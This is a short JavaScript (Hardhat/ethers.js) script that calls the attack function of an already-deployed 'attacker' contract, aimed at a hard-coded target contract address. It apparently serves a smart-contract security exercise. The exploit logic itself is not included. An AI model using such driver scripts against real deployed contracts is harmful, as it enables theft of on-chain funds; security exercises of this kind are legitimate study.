require("dotenv").config();
const { ethers } = require("hardhat");



const provider = new ethers.providers.JsonRpcProvider(process.env.RPC_URL)
const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider)
const attackerAddress = "0x99ce7b72D0665d43F90e59E8bb71975F80cB5841";
const contractAddress = "0xcF469d3BEB3Fc24cEe979eFf83BE33ed50988502";
const attakerAbi=[{"inputs":[{"internalType":"address","name":"toAttack","type":"address"}],"name":"attack","outputs":[],"stateMutability":"nonpayable","type":"function"}]

const attaker = new ethers.Contract(
    attackerAddress,
    attakerAbi,
    wallet,
)

async function main(){
    try {
        let tx = await attaker.attack(contractAddress);
        console.log(tx.hash)
    } catch (err) {
        console.log(err);
    }
    

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });